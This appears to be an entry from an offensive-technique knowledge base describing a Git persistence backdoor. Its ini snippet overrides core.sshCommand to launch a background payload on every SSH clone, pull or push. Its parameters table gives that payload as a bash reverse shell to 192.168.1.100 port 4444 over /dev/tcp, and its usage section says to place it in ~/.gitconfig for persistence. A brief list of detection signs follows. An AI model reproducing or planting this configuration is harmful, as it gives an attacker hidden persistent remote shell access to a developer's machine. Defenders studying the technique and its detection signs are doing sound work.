---
type: code
language: ini
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - ssh
  - backdoor
  - git
validated: true
---

# Git-SSH-Command-Backdoor

## Code

```ini
[core]
sshCommand = nohup BACKDOOR >/dev/null 2>&1 & ssh
[ssh]
variant = ssh
```

## Description

Configures Git's SSH handling to execute a backdoor during remote repository operations like clone or push.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `BACKDOOR` | SSH-triggered payload | `bash -i >& /dev/tcp/192.168.1.100/4444 0>&1` |

## Usage

Add to ~/.gitconfig for persistence in remote Git workflows. Triggers on 'git pull' over SSH.

## Detection

- SSH processes with unusual child commands.
- .gitconfig audits for sshCommand mods.
- Network logs showing Git-initiated connections.

## Related

- [[procedures/Backdoor-Git-User-Configurations-for-Persistence]]
